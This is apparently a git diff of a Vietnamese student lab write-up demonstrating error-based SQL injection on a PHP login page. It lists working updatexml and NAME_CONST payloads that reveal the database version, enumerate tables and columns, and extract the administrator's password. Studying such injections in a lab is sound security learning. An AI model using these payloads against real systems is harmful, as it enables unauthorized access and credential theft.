@@ -11,26 +11,69 @@ $cleaned_password = mysqli_real_escape_string($conn, $password);
 Khi em vào giao diện sẽ như thế này
 
 
-![Alt text](./imagesBooleanBase/image.png)
+![Alt text](./imagesBooleanBase/image-20.png)
 
 - Đây là đoạn code dính lỗi sqli:
 
+![Alt text](./imagesErrorBase/image-21.png)
+
+- Em thử dùng lỗi error base để kiểm tra version của data base: em sử dụng payload : 
+            username=aaa&password=hih'+OR+(SELECT+*+FROM+(SELECT+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--+-&login=
+
++ Em nhận được kết quả trả ra là
 ![Alt text](./imagesErrorBase/image-1.png)
 
-- Em thử dùng lỗi error base để kiểm tra: em sử dụng payload :"' or 1=1 group by concat(database(),'-', floor(rand(0)*2)) having min(0)-- -" trong cheat seet sqli
+- Một cách khác nữa là em dùng payload :
+            username=aaa&password=hih'and+updatexml(null,concat(0x0a,version()),null)--+-&login
 
-- or 1=1: Điều kiện luôn đúng, mục đích là để thêm điều kiện vào câu truy vấn.
-- group by concat(database(),'-', floor(rand(0)*2)): Group các kết quả theo giá trị của chuỗi được tạo ra bằng cách ghép nối tên cơ sở dữ liệu, dấu "-", và một giá trị ngẫu nhiên (0 hoặc 1).
-- having min(0): Điều kiện HAVING luôn đúng, vì giá trị nhỏ nhất trong trường min(0) là 0.
-
-+ Em nhận được kết quả
++ Em nhận được kết quả trả ra là :
 ![Alt text](./imagesErrorBase/image-2.png)
 
-- Em có thể thấy được là kết quả trả ra lỗi của database task2_kcsc bảng users và có 1 cột là id
-- Em tiếp tục tìm các cột khác trong bảng users
-Payload : ' or 1=1 group by concat((select column_name from information_schema.columns where table_name='users' limit 2,1),'-',floor(rand(0)*2)) having min(0)-- -
+Và version của database là : 10.4.32-MariaDB
+
+- Em tiếp tục sử dụng payload: username=aaa&password=hih'and+updatexml(null,concat(0x0a,version()),null)--+-&login=
 ![Alt text](./imagesErrorBase/image-3.png)
-- sau đó em dùng : ' or 1=1 group by concat((select password from users limit 2,1),'-',floor(rand(0)*2)) having min(0)-- -
--> Em nhận được mật khẩu là hihi123
++ Em nhận được tên database là task2_kcsc:
+
+
+- Em có thể thấy được là kết quả trả ra lỗi của database task2_kcsc bảng users khi em dùng payload:
+        'admi'+and+updatexml(null,concat(0x0a, 
+        (select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+LIMIT+1,1)),null)--
+
+![Alt text](./imagesErrorBase/image-4.png)
+- Nếu LIMIT 0,1 thì em có thêm thông tin tên bảng là products nữa ạ:
+![Alt text](./imagesErrorBase/image-5.png)
+- Mục đích chính của em là tìm mật khẩu của quản trị viên nên em tiếp tục tìm các cột khác trong bảng users
+Payload : 'admi'+and+updatexml(null,concat(0x0a,(select+column_name+from+information_schema.columns+where+table_name='users'+limit+0,1)),null)--
+
+Với LIMIT 0,1 em nhận được cột
+'admi'+and+updatexml(null,concat(0x0a,(select+column_name+from+information_schema.columns+where+table_name='users'+limit+0,1)),null)--
+
+Cột này chưa phải thông tin em cần
+![Alt text](./imagesErrorBase/image-6.png)
+em tiêp tục tăng giá trị lên 1 2 3 4 5 và lần lượt nhận tên các cột
+
++TOTAL CONNECTION
+![Alt text](./imagesErrorBase/image-7.png)
++ USER
+![Alt text](./imagesErrorBase/image-8.png)
++ id
+![Alt text](image-9.png)
+đây là tên id của người dùng 
++ password
+![Alt text](./imagesErrorBase/image-10.png)
++ username
+![Alt text](./imagesErrorBase/image-11.png)
+
+- Sau đó em dùng payload: 'admi'+and+updatexml(null,concat(0x0a,(select+username+from+users+limit+0,1)),null)--
+    
+nhận được tên admin là administrator
+![Alt text](image-12.png)
+- cuối cùng em sẽ lấy mật khẩu administrator
+Payload : 'admi'+and+updatexml(null,concat(0x0a,(select+password+from+users+where+username='administrator'+limit+0,1)),null)--
+Và kết quả :
+![Alt text](image-13.png)
+
+-> Vậy là em đã nhận được mật khẩu là hihi123
 
 
